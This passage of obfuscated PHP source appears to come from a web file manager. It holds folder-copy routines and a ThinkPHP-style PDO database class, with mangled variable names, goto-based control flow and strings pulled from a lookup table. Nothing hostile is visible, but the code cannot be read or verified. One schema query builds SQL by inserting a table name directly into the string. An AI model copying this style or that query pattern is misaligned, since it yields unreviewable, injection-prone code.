1); $eîßÏ¨ò’Ú = Model($E§¸°˜òŠ[547])->field($E§¸°˜òŠ[450])->where($BÉ¬‰Ä²­«)->select(); goto cšÍÛ¸È‹Û; bº¯ì… ÙÈ: if ($F²İ×ŒÁİè[$E§¸°˜òŠ[467]] == $dÛ­³×ĞñÁ[$E§¸°˜òŠ[467]] && $F²İ×ŒÁİè[$E§¸°˜òŠ[380]] == $E§¸°˜òŠ[546]) { return; } $BÉ¬‰Ä²­« = array($E§¸°˜òŠ[470] => array($E§¸°˜òŠ[494], $F²İ×ŒÁİè[$E§¸°˜òŠ[470]] . $f…êÄÀ ‡ . $E§¸°˜òŠ[495])); $C³”Å’ƒ = $this->field($E§¸°˜òŠ[392])->where($BÉ¬‰Ä²­«)->getField($E§¸°˜òŠ[378], !0); goto E’ÙÇäœôÚ; fæè¡Ïç¶: $E§¸°˜òŠ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $F²İ×ŒÁİè = $this->sourceInfo($f…êÄÀ ‡); $dÛ­³×ĞñÁ = $this->sourceInfo($B¾Ÿ˜à‹­); goto bº¯ì… ÙÈ; A„ó‰Îáë: Model($E§¸°˜òŠ[547])->where($BÉ¬‰Ä²­«)->save(array($E§¸°˜òŠ[457] => 0)); Model($E§¸°˜òŠ[548])->where($BÉ¬‰Ä²­«)->delete(); goto Bá–¼Ü¼©; cšÍÛ¸È‹Û: if (!$eîßÏ¨ò’Ú) { return; } $eîßÏ¨ò’Ú = array_to_keyvalue($eîßÏ¨ò’Ú, $E§¸°˜òŠ[43], $E§¸°˜òŠ[450]); $BÉ¬‰Ä²­« = array($E§¸°˜òŠ[450] => array($E§¸°˜òŠ[17], $eîßÏ¨ò’Ú)); goto A„ó‰Îáë; Bá–¼Ü¼©: } public function copyFolderFromIO($F¢§Ú„„‡», $e­®Ù‹Êá®, $eçß§îíƒÇ, $B¼Ïáîßóí, $FØº„ô†Îµ, $dë“ì = false) { goto eÊˆŸÕ“Ë³; D— ˜âéâÌ: Hook::trigger($Càøé‹Œóå[551]); if ($A·Àâµœñ») { $this->folderSizeResetChildren($A·Àâµœñ»); } $this->_childrenListClear(); goto C©Íˆ½¢É’; E‹‰«×Ü¯§: Model($Càøé‹Œóå[431])->linkAdd($FïØÊ÷ëµ[$Càøé‹Œóå[512]]); Model($Càøé‹Œóå[431])->remove($FïØÊ÷ëµ[$Càøé‹Œóå[549]]); $this->folderSizeReset($eçß§îíƒÇ); goto BÅ‰Ä¼¬‘; B·ŠœÅÅÌÕ: $B§¤Üã‚³Î = $this->fileNameExist($eçß§îíƒÇ, $f©«ÎÒÈ“Ç); $A·Àâµœñ» = $this->mkdir($eçß§îíƒÇ, $f©«ÎÒÈ“Ç, $B¼Ïáîßóí); if (!$B§¤Üã‚³Î || $B¼Ïáîßóí == REPEAT_RENAME_FOLDER) { $B¼Ïáîßóí = !1; } goto dÖ¥Íà¨«; dÖ¥Íà¨«: if ($B§¤Üã‚³Î) { $this->_childrenAllMake($B§¤Üã‚³Î); } Hook::trigger($Càøé‹Œóå[550]); $this->_copyChildTo($F¢§Ú„„‡», $e­®Ù‹Êá®, $A·Àâµœñ», $B¼Ïáîßóí, $FïØÊ÷ëµ, $FØº„ô†Îµ); goto D— ˜âéâÌ; BÅ‰Ä¼¬‘: $this->updateModifyTime($eçß§îíƒÇ); return $A·Àâµœñ»; goto BÉ‚ÒŒàƒí; C©Íˆ½¢É’: Model($Càøé‹Œóå[515])->addAll($FïØÊ÷ëµ[$Càøé‹Œóå[513]], array(), !0); Model($Càøé‹Œóå[516])->eventCopy($A·Àâµœñ»); $this->saveAll($FïØÊ÷ëµ[$Càøé‹Œóå[514]]); goto E‹‰«×Ü¯§; eÊˆŸÕ“Ë³: $Càøé‹Œóå =& $_SERVER[çŞáÓæÚô‚Ô‡]; $FïØÊ÷ëµ = array($Càøé‹Œóå[513] => array(), $Càøé‹Œóå[514] => array(), $Càøé‹Œóå[512] => array(), $Càøé‹Œóå[549] => array()); $f©«ÎÒÈ“Ç = $dë“ì ? $dë“ì : $F¢§Ú„„‡»->getPathName($F¢§Ú„„‡»->pathThis($e­®Ù‹Êá®)); goto B·ŠœÅÅÌÕ; BÉ‚ÒŒàƒí: } private function _copyChildTo($f‚É…ì½Š, $F¤†ÉÍÑ£, $b¸Èº¹À¾, $F®ëå¹ƒí, &$C„±§†·ñ¨, $D†ˆ½™±Ú) { goto eø˜©íÀ‘¼; B¢«š…ÉÊ: foreach ($a¶ôï¹¼‚ as &$DŒØ«Ù˜¬³) { goto eß»º®; DÇ¯…©ñ©ô: if ($F®ëå¹ƒí) { $AæìÄÔ¢¬³ = $this->fileNameExistCache($b¸Èº¹À¾, $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[38]]); if ($AæìÄÔ¢¬³) { if ($DŒØ«Ù˜¬³[$f±İêÕš‹ğ[379]] || $F®ëå¹ƒí == REPEAT_SKIP) { continue; } if ($F®ëå¹ƒí == REPEAT_REPLACE) { $C§àá¯è•Ş = $this->sourceInfoCache($AæìÄÔ¢¬³); $eùŠéˆá‰ç = $this->fileHistory($C§àá¯è•Ş, $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[428]], $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[87]]); if ($eùŠéˆá‰ç) { $C„±§†·ñ¨[$f±İêÕš‹ğ[512]][] = $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[428]]; } continue; } else { if ($F®ëå¹ƒí == REPEAT_RENAME) { $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[38]] = $this->fileNameAutoCache($b¸Èº¹À¾, $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[38]], $F®ëå¹ƒí, !1); } } } } if (!$DŒØ«Ù˜¬³[$f±İêÕš‹ğ[379]] && $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[428]]) { $C„±§†·ñ¨[$f±İêÕš‹ğ[512]][] = $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[428]]; } $d»µºäÍ¡ƒ[] = $this->_makeItemData($DŒØ«Ù˜¬³, $C²‹¼ø— , $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[38]]); goto b…—…¢Î°; eß»º®: if (isset($AŠŒ³Šã‚ä[$DŒØ«Ù˜¬³[$f±İêÕš‹ğ[38]]])) { $DŒØ«Ù˜¬³ = $AŠŒ³Šã‚ä[$DŒØ«Ù˜¬³[$f±İêÕš‹ğ[38]]]; } $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[379]] = $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[39]] == $f±İêÕš‹ğ[86]; $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[381]] = _get($DŒØ«Ù˜¬³, $f±İêÕš‹ğ[170], $f±İêÕš‹ğ[43]); goto f×µ¢ªÜæï; f×µ¢ªÜæï: $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[87]] = _get($DŒØ«Ù˜¬³, $f±İêÕš‹ğ[87], 0); $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[428]] = _get($DŒØ«Ù˜¬³, $f±İêÕš‹ğ[428], 0); if (!isset($DŒØ«Ù˜¬³[$f±İêÕš‹ğ[552]]) && $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[428]]) { $C„±§†·ñ¨[$f±İêÕš‹ğ[549]][] = $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[428]]; } goto DÇ¯…©ñ©ô; b…—…¢Î°: } unset($DŒØ«Ù˜¬³); if (!empty($d»µºäÍ¡ƒ)) { $this->addAll($d»µºäÍ¡ƒ); } goto fËÏŒ¡›†”; eø˜©íÀ‘¼: $f±İêÕš‹ğ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $C²‹¼ø—  = $this->sourceInfoCache($b¸Èº¹À¾); $f¿Í«­  = $f‚É…ì½Š->listPath($F¤†ÉÍÑ£, !1, !0); goto A¿–öÀ„Ä; A¿–öÀ„Ä: $a¶ôï¹¼‚ = array_merge($f¿Í«­ [$f±İêÕš‹ğ[83]], $f¿Í«­ [$f±İêÕš‹ğ[84]]); $AŠŒ³Šã‚ä = $this->_addFiles($f‚É…ì½Š, $f¿Í«­ [$f±İêÕš‹ğ[83]], $D†ˆ½™±Ú); $d»µºäÍ¡ƒ = array(); goto B¢«š…ÉÊ; fËÏŒ¡›†”: $eè‹§İî„¯ = $this->_childrenList($b¸Èº¹À¾); $eè‹§İî„¯ = array_to_keyvalue($eè‹§İî„¯, $f±İêÕš‹ğ[38]); foreach ($a¶ôï¹¼‚ as $DŒØ«Ù˜¬³) { $C§àá¯è•Ş = $eè‹§İî„¯[$DŒØ«Ù˜¬³[$f±İêÕš‹ğ[38]]]; $dİ¼¥±²‰¦ = $C§àá¯è•Ş[$f±İêÕš‹ğ[378]]; $this->_copyApplyMeta($C§àá¯è•Ş, $C„±§†·ñ¨); if ($DŒØ«Ù˜¬³[$f±İêÕš‹ğ[39]] == $f±İêÕš‹ğ[86]) { $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[85]] = $f‚É…ì½Š->getPathInner($DŒØ«Ù˜¬³[$f±İêÕš‹ğ[85]]); $this->_copyChildTo($f‚É…ì½Š, $DŒØ«Ù˜¬³[$f±İêÕš‹ğ[85]], $dİ¼¥±²‰¦, $F®ëå¹ƒí, $C„±§†·ñ¨, $D†ˆ½™±Ú); } } goto EàŸÃĞ„Â; EàŸÃĞ„Â: } private function _addFiles($c„è¶óœ•›, $EÈ˜Ÿæ„Â, $CÄ‚œ£®Ò) { goto A¶÷ƒ¼¹°ó; c‰âàôò»ò: $c‘ö°Åçã… = Model($bÇºª¿Å¯Ê[555]); $C‡×ô‚—ó„ = $c‘ö°Åçã…->where($A™›ÛÂŒ—…)->select(); $C‡×ô‚—ó„ = $C‡×ô‚—ó„ ? $C‡×ô‚—ó„ : array(); goto eÚã¶¦Êİ; E‹ÂÀª¡’: foreach ($EÈ˜Ÿæ„Â as $a¥óÍõñ¶È) { $EÅÑ¹±ŒÜÆ[$a¥óÍõñ¶È[$bÇºª¿Å¯Ê[38]]] = $a¥óÍõñ¶È; } return $EÅÑ¹±ŒÜÆ; goto d¹¸ì¹ˆª; AŠ ´Ò¹Ô: $c‘ö°Åçã…->addAll($c„ùì¹„Ôù); $A™›ÛÂŒ—… = array($bÇºª¿Å¯Ê[173] => array($bÇºª¿Å¯Ê[17], array_keys($a“‡¢Ğ­î))); $C‡×ô‚—ó„ = $c‘ö°Åçã…->where($A™›ÛÂŒ—…)->select(); goto d‚Ø÷ôË ; eÚã¶¦Êİ: foreach ($C‡×ô‚—ó„ as $eôòê¢“î) { if (!isset($a“‡¢Ğ­î[$eôòê¢“î[$bÇºª¿Å¯Ê[173]]])) { continue; } $e«…³¬êÜ = $a“‡¢Ğ­î[$eôòê¢“î[$bÇºª¿Å¯Ê[173]]]; foreach ($e«…³¬êÜ as &$eÑ®†à) { $eÑ®†à[$bÇºª¿Å¯Ê[428]] = $eôòê¢“î[$bÇºª¿Å¯Ê[428]]; $eÑ®†à[$bÇºª¿Å¯Ê[552]] = !0; } unset($eÑ®†à); } $c„ùì¹„Ôù = array(); foreach ($EÈ˜Ÿæ„Â as $bÉ‚¹Âæîß) { if (isset($bÉ‚¹Âæîß[$bÇºª¿Å¯Ê[552]]) && $bÉ‚¹Âæîß[$bÇºª¿Å¯Ê[552]]) { continue; } $F¥‘–Š§¦á = $c„è¶óœ•›->getPathInner($bÉ‚¹Âæîß[$bÇºª¿Å¯Ê[85]]); $CŠ¤—„îº² = $c‘ö°Åçã…->addFileMake($F¥‘–Š§¦á, $bÉ‚¹Âæîß[$bÇºª¿Å¯Ê[87]], $bÉ‚¹Âæîß[$bÇºª¿Å¯Ê[174]], $bÉ‚¹Âæîß[$bÇºª¿Å¯Ê[173]], $bÉ‚¹Âæîß[$bÇºª¿Å¯Ê[38]], $CÄ‚œ£®Ò); $c„ùì¹„Ôù[] = $CŠ¤—„îº²; } goto AŠ ´Ò¹Ô; dëÈô™Â–ƒ: foreach ($EÈ˜Ÿæ„Â as &$eÑ®†à) { goto F¼¥Š‹–†; eÊÌ™èÀ‹Ú: $Dİ’ôøàôÚ = $c„è¶óœ•›->hashMd5($eÑ®†à[$bÇºª¿Å¯Ê[85]]); if (strlen($Dİ’ôøàôÚ) > 10 && !isset($a“‡¢Ğ­î[$Dİ’ôøàôÚ])) { $a“‡¢Ğ­î[$Dİ’ôøàôÚ] = array(); } $eÑ®†à[$bÇºª¿Å¯Ê[174]] = $e„»­«­³ø; goto A¥¬¼ºÈÖ; fƒ‚æ¸Ô§½: if (count($a“‡¢Ğ­î[$Dİ’ôøàôÚ]) > 1) { $eÑ®†à[$bÇºª¿Å¯Ê[552]] = !0; } goto CäğÕ„Êöƒ; F¼¥Š‹–†: Hook::trigger($bÇºª¿Å¯Ê[553], $eÑ®†à); $eÑ®†à[$bÇºª¿Å¯Ê[85]] = $c„è¶óœ•›->getPathInner($eÑ®†à[$bÇºª¿Å¯Ê[85]]); $e„»­«­³ø = $c„è¶óœ•›->hashSimple($eÑ®†à[$bÇºª¿Å¯Ê[85]]); goto eÊÌ™èÀ‹Ú; A¥¬¼ºÈÖ: $eÑ®†à[$bÇºª¿Å¯Ê[173]] = $Dİ’ôøàôÚ; Hook::trigger($bÇºª¿Å¯Ê[554], $eÑ®†à); $a“‡¢Ğ­î[$Dİ’ôøàôÚ][] =& $eÑ®†à; goto fƒ‚æ¸Ô§½; CäğÕ„Êöƒ: } unset($eÑ®†à); $A™›ÛÂŒ—… = array($bÇºª¿Å¯Ê[173] => array($bÇºª¿Å¯Ê[17], array_keys($a“‡¢Ğ­î))); goto c‰âàôò»ò; d‚Ø÷ôË : $C‡×ô‚—ó„ = $C‡×ô‚—ó„ ? $C‡×ô‚—ó„ : array(); foreach ($C‡×ô‚—ó„ as $eôòê¢“î) { if (!isset($a“‡¢Ğ­î[$eôòê¢“î[$bÇºª¿Å¯Ê[173]]])) { continue; } $Eâ³Ã•¡ÛÆ =& $a“‡¢Ğ­î[$eôòê¢“î[$bÇºª¿Å¯Ê[173]]]; foreach ($Eâ³Ã•¡ÛÆ as &$eÑ®†à) { $eÑ®†à[$bÇºª¿Å¯Ê[428]] = $eôòê¢“î[$bÇºª¿Å¯Ê[428]]; } unset($eÑ®†à); } $EÅÑ¹±ŒÜÆ = array(); goto E‹ÂÀª¡’; A¶÷ƒ¼¹°ó: $bÇºª¿Å¯Ê =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!$EÈ˜Ÿæ„Â || count($EÈ˜Ÿæ„Â) == 0) { return array(); } $a“‡¢Ğ­î = array(); goto dëÈô™Â–ƒ; d¹¸ì¹ˆª: } } goto a†’Ñˆç·; b›¿‡İ°Ú¹: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Aæ–„³êÍ› = '') { $cÒİ¦°¡‹ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!class_exists($cÒİ¦°¡‹[832])) { think_exception(think_lang($cÒİ¦°¡‹[20]) . $cÒİ¦°¡‹[833]); } if (!empty($Aæ–„³êÍ›)) { $this->config = $Aæ–„³êÍ›; if (empty($this->config[$cÒİ¦°¡‹[23]])) { $this->config[$cÒİ¦°¡‹[23]] = array(); } } } public function connect($aÎäÀ±¯¶ = '', $bƒ‘ß«‹çó = 0) { $cÉ“Ó¾±¿ò =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (!isset($this->linkID[$bƒ‘ß«‹çó])) { goto c…®ßÙÃÂµ; c…®ßÙÃÂµ: if (empty($aÎäÀ±¯¶)) { $aÎäÀ±¯¶ = $this->config; } if ($this->pconnect) { $aÎäÀ±¯¶[$cÉ“Ó¾±¿ò[23]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$bƒ‘ß«‹çó] = new PDO($aÎäÀ±¯¶[$cÉ“Ó¾±¿ò[834]], $aÎäÀ±¯¶[$cÉ“Ó¾±¿ò[807]], $aÎäÀ±¯¶[$cÉ“Ó¾±¿ò[808]], $aÎäÀ±¯¶[$cÉ“Ó¾±¿ò[23]]); } catch (PDOException $FÕîšòõµØ) { think_exception($FÕîšòõµØ->getMessage()); } goto C×´„Ş˜Ä£; CæœŠìÍ­è: try { $this->linkID[$bƒ‘ß«‹çó]->exec($cÉ“Ó¾±¿ò[843] . think_config($cÉ“Ó¾±¿ò[810])); } catch (Exception $FÕîšòõµØ) { } $this->connected = !0; if (1 != think_config($cÉ“Ó¾±¿ò[28])) { unset($this->config); } goto eÇ°ìÁ²²¬; C×´„Ş˜Ä£: $this->dbType = $this->_getDsnType($aÎäÀ±¯¶[$cÉ“Ó¾±¿ò[834]]); if (in_array($this->dbType, array($cÉ“Ó¾±¿ò[835], $cÉ“Ó¾±¿ò[836], $cÉ“Ó¾±¿ò[837], $cÉ“Ó¾±¿ò[838]))) { think_exception($cÉ“Ó¾±¿ò[839] . $this->dbType . $cÉ“Ó¾±¿ò[840] . $this->dbType . $cÉ“Ó¾±¿ò[841]); } if (!$this->linkID[$bƒ‘ß«‹çó]) { think_exception($cÉ“Ó¾±¿ò[842]); } goto CæœŠìÍ­è; eÇ°ìÁ²²¬: } return $this->linkID[$bƒ‘ß«‹çó]; } public function free() { $this->PDOStatement = null; } public function query($bÙ™ñ¶ÁÇ­, $Bêö²‘Ş = array()) { goto c›Š…Ù¸»‰; FéåÙ‡……: if (!1 === $Dµ¹šå–Ó) { $this->error(); return !1; } else { return $this->getAll(); } goto DÉ´í‰ê¶; c›Š…Ù¸»‰: $DÜ‚‡†¢Ì» =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aÌ¤ÌšÕê‹; C¼Œó×Â¤Ã: think_action_status($DÜ‚‡†¢Ì»[29], 1); think_status($DÜ‚‡†¢Ì»[30]); $this->PDOStatement = $this->_linkID->prepare($bÙ™ñ¶ÁÇ­); goto eíßŒìï©­; aÌ¤ÌšÕê‹: $this->queryStr = $bÙ™ñ¶ÁÇ­; if (!empty($Bêö²‘Ş)) { $this->queryStr .= $DÜ‚‡†¢Ì»[844] . print_r($Bêö²‘Ş, !0) . $DÜ‚‡†¢Ì»[845]; } if (!empty($this->PDOStatement)) { $this->free(); } goto C¼Œó×Â¤Ã; eíßŒìï©­: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Dµ¹šå–Ó = $this->PDOStatement->execute($Bêö²‘Ş); $this->debug(); goto FéåÙ‡……; DÉ´í‰ê¶: } public function execute($aº­Ğ¬˜í, $Fé ÏÊªŠ© = array()) { goto dƒ¼î‰ğ˜; aá„ÚÜé«È: if ($this->dbType == $c°ˆ±ôÓ˜[838]) { if (preg_match($c°ˆ±ôÓ˜[846], $this->queryStr, $B´³±æä¦Ÿ)) { $this->table = think_config($c°ˆ±ôÓ˜[847]) . str_ireplace(think_config($c°ˆ±ôÓ˜[848]), $c°ˆ±ôÓ˜[370], $B´³±æä¦Ÿ[2]); $dïÄæî”÷ë = (bool) $this->query($c°ˆ±ôÓ˜[849] . strtoupper($this->table) . $c°ˆ±ôÓ˜[65]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($c°ˆ±ôÓ˜[31], 1); goto aË²¯Èç¢“; aË²¯Èç¢“: think_status($c°ˆ±ôÓ˜[30]); $this->PDOStatement = $this->_linkID->prepare($aº­Ğ¬˜í); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto C©éÅöæ; F¸¹é½Ì°˜: $this->queryStr = $aº­Ğ¬˜í; if (!empty($Fé ÏÊªŠ©)) { $this->queryStr .= $c°ˆ±ôÓ˜[844] . print_r($Fé ÏÊªŠ©, !0) . $c°ˆ±ôÓ˜[845]; } $dïÄæî”÷ë = !1; goto aá„ÚÜé«È; dƒ¼î‰ğ˜: $c°ˆ±ôÓ˜ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F¸¹é½Ì°˜; C©éÅöæ: $B›Œò–¿Š = $this->PDOStatement->execute($Fé ÏÊªŠ©); $this->debug(); if (!1 === $B›Œò–¿Š) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($dïÄæî”÷ë || preg_match($c°ˆ±ôÓ˜[850], $aº­Ğ¬˜í)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto Aİ·×Öó‡å; Aİ·×Öó‡å: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $fŠ­”Ü®Á¢ = $this->_linkID->commit(); $this->transTimes = 0; if (!$fŠ­”Ü®Á¢) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $A¡ˆÒ½Õäš = $this->_linkID->rollback(); $this->transTimes = 0; if (!$A¡ˆÒ½Õäš) { $this->error(); return !1; } } return !0; } private function getAll() { $cïĞ½šÌ‡Ç = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($cïĞ½šÌ‡Ç); return $cïĞ½šÌ‡Ç; } public function getFields($F§á•öóî¼) { goto F·ò‘Ä›ÊÖ; F·ò‘Ä›ÊÖ: $eñ´¢¤Ÿà =& $_SERVER[çŞáÓæÚô‚Ô‡]; $this->initConnect(!0); if (think_config($eñ´¢¤Ÿà[851])) { $D—®åó î¹ = str_replace($eñ´¢¤Ÿà[852], $F§á•öóî¼, think_config($eñ´¢¤Ÿà[851])); } else { switch ($this->dbType) { case $eñ´¢¤Ÿà[835]: case $eñ´¢¤Ÿà[853]: $D—®åó î¹ = "\123\105\114\x45\x43\x54\40\40\40\143\157\154\165\155\x6e\137\156\x61\x6d\145\x20\x61\163\40\47\x4e\141\155\145\47\x2c\40\x20\x20\x64\x61\164\x61\x5f\164\x79\x70\x65\40\x61\163\40\47\124\171\160\x65\47\54\x20\x20\40\143\x6f\x6c\x75\155\x6e\x5f\x64\145\146\141\165\x6c\164\x20\141\163\40\47\x44\x65\x66\x61\x75\154\164\x27\x2c\x20\40\x20\x69\163\137\156\x75\x6c\154\141\142\x6c\x65\40\x61\163\40\47\116\x75\154\x6c\47\xa\11\x9\x46\122\x4f\115\11\151\156\146\x6f\162\x6d\x61\164\151\x6f\156\x5f\163\x63\150\x65\155\141\x2e\164\141\x62\x6c\x65\163\40\x41\123\x20\164\12\x9\x9\112\x4f\x49\116\x9\151\156\146\x6f\x72\x6d\141\164\151\157\x6e\x5f\163\x63\150\145\x6d\x61\56\x63\157\x6c\165\155\156\x73\40\101\123\40\143\xa\11\x9\x4f\x4e\x20\40\x74\x2e\164\141\142\x6c\x65\137\x63\141\x74\x61\154\157\x67\x20\x3d\40\x63\56\x74\141\142\x6c\145\137\x63\141\x74\x61\x6c\x6f\147\12\x9\11\101\x4e\x44\40\x74\x2e\164\141\142\154\145\x5f\x73\x63\x68\x65\155\x61\x20\x3d\x20\x63\x2e\x74\x61\x62\x6c\x65\137\163\x63\x68\145\x6d\x61\xa\11\x9\x41\x4e\x44\40\164\56\164\x61\142\x6c\145\x5f\156\141\x6d\x65\40\75\x20\143\x2e\x74\141\x62\x6c\x65\137\x6e\141\x6d\x65\12\11\x9\127\110\105\122\x45\40\x20\x20\x74\56\x74\x61\x62\x6c\x65\x5f\x6e\141\155\x65\x20\x3d\40\x27{$F§á•öóî¼}\x27"; break; case $eñ´¢¤Ÿà[854]: $D—®åó î¹ = $eñ´¢¤Ÿà[855] . $F§á•öóî¼ . $eñ´¢¤Ÿà[856]; break; case $eñ´¢¤Ÿà[836]: case $eñ´¢¤Ÿà[838]: $D—®åó î¹ = $eñ´¢¤Ÿà[857] . $eñ´¢¤Ÿà[858] . $eñ´¢¤Ÿà[859] . strtoupper($F§á•öóî¼) . $eñ´¢¤Ÿà[860] . strtoupper($F§á•öóî¼) . $eñ´¢¤Ÿà[861]; break; case $eñ´¢¤Ÿà[862]: $D—®åó î¹ = $eñ´¢¤Ÿà[863] . $F§á•öóî¼ . $eñ´¢¤Ÿà[864]; break; case $eñ´¢¤Ÿà[837]: break; case $eñ´¢¤Ÿà[865]: default: $D—®åó î¹ = $eñ´¢¤Ÿà[866] . ($this->dbType == $eñ´¢¤Ÿà[865] ? "\x60{$F§á•öóî¼}\x60" : $F§á•öóî¼); } } goto c•áİãµ¹é; E‚™ŸÉŒŸÓ: return $Fç±„–İİÕ; goto Bë¡ÅƒÛĞ; c•áİãµ¹é: $fì‚’‹Å‘ï = $this->query($D—®åó î¹); $Fç±„–İİÕ = array(); if ($fì‚’‹Å‘ï) { foreach ($fì‚’‹Å‘ï as $B÷¶ŸíÈ´Ú => $bˆòÕ‡‚ÎÍ) { $bˆòÕ‡‚ÎÍ = array_change_key_case($bˆòÕ‡‚ÎÍ); $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[38]] = isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[38]]) ? $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[38]] : $eñ´¢¤Ÿà[370]; $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[39]] = isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[39]]) ? $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[39]] : $eñ´¢¤Ÿà[370]; $F«ÎŞñÁœ‚ = isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[270]]) ? $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[270]] : $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[38]]; $Fç±„–İİÕ[$F«ÎŞñÁœ‚] = array($eñ´¢¤Ÿà[38] => $F«ÎŞñÁœ‚, $eñ´¢¤Ÿà[39] => $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[39]], $eñ´¢¤Ÿà[41] => (bool) (isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[109]]) && $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[109]] === $eñ´¢¤Ÿà[43] || isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[41]]) && $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[41]] === $eñ´¢¤Ÿà[43]), $eñ´¢¤Ÿà[44] => isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[44]]) ? $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[44]] : (isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[63]]) ? $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[63]] : $eñ´¢¤Ÿà[370]), $eñ´¢¤Ÿà[46] => isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[99]]) ? strtolower($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[99]]) == $eñ´¢¤Ÿà[48] : (isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[64]]) ? $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[64]] : !1), $eñ´¢¤Ÿà[49] => isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[867]]) ? strtolower($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[867]]) == $eñ´¢¤Ÿà[51] : (isset($bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[99]]) ? $bˆòÕ‡‚ÎÍ[$eñ´¢¤Ÿà[99]] : !1)); } } goto E‚™ŸÉŒŸÓ; Bë¡ÅƒÛĞ: } public function getTables($C«õ§°„Öê = '') { $bËÈ«º¡˜­ =& $_SERVER[çŞáÓæÚô‚Ô‡]; if (think_config($bËÈ«º¡˜­[868])) { $BÅÆœÕØêÛ = str_replace($bËÈ«º¡˜­[869], $C«õ§°„Öê, think_config($bËÈ«º¡˜­[868])); } else { switch ($this->dbType) { case $bËÈ«º¡˜­[836]: case $bËÈ«º¡˜­[838]: $BÅÆœÕØêÛ = $bËÈ«º¡˜­[870]; break; case $bËÈ«º¡˜­[835]: case $bËÈ«º¡˜­[853]: $BÅÆœÕØêÛ = $bËÈ«º¡˜­[871]; break; case $bËÈ«º¡˜­[862]: $BÅÆœÕØêÛ = $bËÈ«º¡˜­[872]; break; case $bËÈ«º¡˜­[837]: think_exception(think_lang($bËÈ«º¡˜­[873]) . $bËÈ«º¡˜­[874]); break; case $bËÈ«º¡˜­[854]: $BÅÆœÕØêÛ = $bËÈ«º¡˜­[52] . $bËÈ«º¡˜­[53] . $bËÈ«º¡˜­[54]; break; case $bËÈ«º¡˜­[865]: default: if (!empty($C«õ§°„Öê)) { $BÅÆœÕØêÛ = $bËÈ«º¡˜­[818] . $C«õ§°„Öê; } else { $BÅÆœÕØêÛ = $bËÈ«º¡˜­[819]; } } } $C†–ó¨×á§ = $this->query($BÅÆœÕØêÛ); $eÍ–…ÊğŸ = array(); foreach ($C†–ó¨×á§ as $C…Êæôµ˜ => $föÏË˜ß°µ) { $eÍ–…ÊğŸ[$C…Êæôµ˜] = current($föÏË˜ß°µ); } return $eÍ–…ÊğŸ; } protected function parseLimit($FÆ¡»Åİ¡¿) { $aõƒôŞ¬¯ =& $_SERVER[çŞáÓæÚô‚Ô‡]; $cÂÇ®ª–Û = $aõƒôŞ¬¯[43]; if (!empty($FÆ¡»Åİ¡¿)) { switch ($this->dbType) { case $aõƒôŞ¬¯[862]: case $aõƒôŞ¬¯[854]: $FÆ¡»Åİ¡¿ = explode($aõƒôŞ¬¯[57], $FÆ¡»Åİ¡¿); if (count($FÆ¡»Åİ¡¿) > 1) { $cÂÇ®ª–Û .= $aõƒôŞ¬¯[58] . $FÆ¡»Åİ¡¿[1] . $aõƒôŞ¬¯[59] 